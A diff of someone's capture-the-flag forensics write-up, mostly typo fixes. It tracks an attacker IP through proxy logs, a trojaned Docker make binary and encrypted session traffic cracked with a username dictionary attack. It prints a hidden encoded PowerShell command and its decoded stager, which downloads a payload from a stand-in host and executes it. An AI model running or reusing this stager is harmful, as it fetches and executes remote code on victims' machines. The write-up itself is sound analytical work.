@@ -12,21 +12,23 @@ victim -> attacker
 
 1. 203.0.113.120 -> 172.22.10.203
 2. 192.168.212.45 -> 172.22.10.203
-3. 192.168.195.195.32 ->172.22.10.203
+3. 192.168.195.32 ->172.22.10.203
 
 ## challenge 2
 
-see if the proxy log has the attacker IP we saw before 
+see if the proxy log has the attacker IP we saw before
 
 ```bash
 cat proxy.log | grep '172.22.10.203'  
 ```
 
+which returns the following result
+
 ```bash
 2021-03-16 08:03:21 42 10.58.121.64 200 TCP_MISS 12734 479 GET http tcthy.invalid chairman - - DIRECT 172.22.10.203 application/octet-stream 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko' PROXIED none - 10.58.121.11 SG-HTTP-Service - none -
 ```
 
-take the time the seen in the log and compare it to the time spans 
+take the timestamp the seen in the log and compare it to the timespans between when users are logged in according to the logs to see who might have been comprimised.
 
 ```powershell
 $logon = Get-Content ./logins.json | ConvertFrom-Json
@@ -71,13 +73,13 @@ Content-Disposition: attachment; filename="sam3.jpg"
 MIME-Version: 1.0
 ```
 
-this image is actually a base64 encode powershell payload that is encoded and to run silently
+this image is actually a base64 encode powershell payload that is encoded and set to run silently
 
 ```powershell
 powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AdABjAHQAaAB5AC4AaQBuAHYAYQBsAGkAZAAvAGMAaABhAGkAcgBtAGEAbgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADEANwAzAAoACgAkAGQAZQBjACAAPQAgACQAKABmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABiAHkAdABlAHMALgBsAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAKACAAIAAgACAAJABwAHIAZQB2ACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAHAAcgBlAHYACgAgACAAIAAgACQAcAByAGUAdgAKAH0AKQAKAAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjACkAKQAKAA==
 ```
 
-This encoded portion then is further extracted to 
+This encoded portion then is further extracted to:
 
 ```powershell
 $bytes = (New-Object Net.WebClient).DownloadData('http://tcthy.invalid/chairman')
@@ -552,7 +554,7 @@ looking at the data in the docker image file given the maintainer information is
 }
 ```
 
-the docker component added by PANIC is call build_test.sh (see below)
+then docker component added by PANIC is call build_test.sh (see below)
 
 ```bash
 #!/bin/bash
@@ -569,13 +571,13 @@ make check
 ```
 
 looking at the run scripts and configuartions nothing looks too out of the place.
-this lead to me looking at the path to see if there was a path hijack
+this lead to me looking at the PATH to see if there was a path hijack
 
 ```bash
 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 ```
 
-in looking at the files i noticed that the make file had a method called gitGrabber() making the file suspect.
+in looking at the files there was. In quick inspection the make file had a method called gitGrabber() making the file suspect.
 
 it was placed in the f7cca439f519c3fad85e9fe65db17b4a8a7692a39888dadb8d085184e4fde89b layer @ /usr/bin/make
 
@@ -610,7 +612,7 @@ in here we can see the values requested for IP, version and public key.
 
 the public key coversion was hard because you need to read it it to hex encoded characters. This is done by running `x/32c <memory addres>` this coverts the address to a string which is 32 bytes
 
-to further confirm this this funtion below is run. It is the function to send data to the LP on port 6666
+to further confirm this this function below is run. It is the function to send data to the LP on port 6666
 
 ```c
 wolyxeplhuiyl(ip=0x7ffff77f0c94 "198.51.100.227", port=0x1a0a, output=0x7fffffffeb20 "", length=0x0)
@@ -651,33 +653,22 @@ as seen in the chart after the initial transfer of the machine identifier data i
 
 This makes the target for decryption the Secret Box because Cracking the CryptoBox would take longer than the universe has been around. However the LibSodium library uses xsalsa20 under the hood. This is a stream cipher.
 
-Taking this knowledge we can get the length of the initial string transferred then use that to to derive the length of the username. 
+The best solution was to preform a dictionary attack on the session. To facilitate this I wrote the following tool <https://github.com/khanson66/Codebreaker-Session-Decryptor>
+then used danielmiessler's list of names as my name target <https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt>
 
-username length calculation: `length=len(hex_cipher)-32-142`
-then take the count of the hex of the base64 encoded `username=xxx` this will give you the length of the username. NOTE: because it is base64ed the length will be 3 wide.
-
-wordlist attempted (https://github.com/jeanphorn/wordlist/blob/master/usernames.txt, https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames-dup.txt)
+The returns the following sessions
 
 |ip|key|uuid|
 |---|---|---|
-|192.168.212.45|hildegaard+3.0.4.8+1615896246|3ce970a0-e6d3-4498-87e1-63db65602cd4|
+|198.19.36.22|beckett+0.3.6.5+1615896180|63709401-10cb-4a52-b5a5-e83fdd10c4a3|
+|172.31.98.237|cathleen+2.0.9.2+1615896189|2ea26424-509d-4804-a75c-360a7a2988a3|
+|172.22.10.88|root+1.4.0.3+1615896201|a6d9bc5f-7857-4dd2-9b31-7d735f6544c6|
 |192.168.195.37|tallulah+1.1.2.9+1615896210|3db4e26e-13ce-4730-a799-ba66000cec15|
+|192.168.212.45|hildegaard+3.0.4.8+1615896246|3ce970a0-e6d3-4498-87e1-63db65602cd4|
+|192.168.225.53|bronwyn+3.4.9.1+1615896253|6b674bec-30e6-4fad-94c0-82a619aca04c|
 
-The following code can decrypt the Cryptobox data
-``` Python
-import nacl.utils
-from nacl.public import PrivateKey, PublicKey, Box
-import keys
+The question only asks for the UUID coming from the DIB address space which are the following ips seen above:
 
-print(keys.sus_text)
-enc_pub = PublicKey(public_key=keys.public_key)
-enc_priv = PrivateKey(private_key=keys.client_sec)
-encryptor = Box(public_key=enc_pub, private_key=enc_priv)
-out = encryptor.decrypt(ciphertext=keys.ciphertext,nonce=keys.nonce)
-print(out)
-```
-https://crypto.stackexchange.com/questions/30181/curve25519-alice-can-decrypt-her-own-message-to-bob
-
-https://twitter.com/matthew_d_green/status/1411296706109509637
-
-https://intel471.com/blog/revil-ransomware-as-a-service-an-analysis-of-a-ransomware-affiliate-operation
+* 192.168.212.45
+* 192.168.195.37
+* 172.22.10.88
